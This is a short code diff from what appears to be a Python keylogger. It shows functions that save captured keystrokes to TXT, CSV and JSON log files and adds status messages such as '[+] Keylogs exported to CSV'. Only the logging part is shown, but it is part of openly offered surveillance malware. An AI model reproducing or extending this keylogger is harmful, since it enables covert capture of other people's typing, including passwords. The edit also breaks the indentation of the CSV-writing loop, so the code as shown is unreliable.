@@ -24,19 +24,22 @@ def text(key):
         file.write(f"Timestamp: {Time}, Language: {lang}\n")
         file.write(key)
         file.write("\n\n")
+        print("[+] Keylogs exported to TXT file")
+
 
 def csv_log(key_list):
     with open(os.path.join("log", "log.csv"), "a+", newline="") as csv_file:
         csv_writer = csv.writer(csv_file)
         for item in key_list:
-            csv_writer.writerow([item])
-         
+         csv_writer.writerow([item])
+        print("[+] Keylogs exported to CSV")
 
 def update_json(key_list):
     with open(os.path.join("log", "logs.json"), 'w') as log:
         json_data = json.dumps(key_list)
         log.write(json_data)
-
+      
+     
 def text_logs():
     text(str(keys))
 
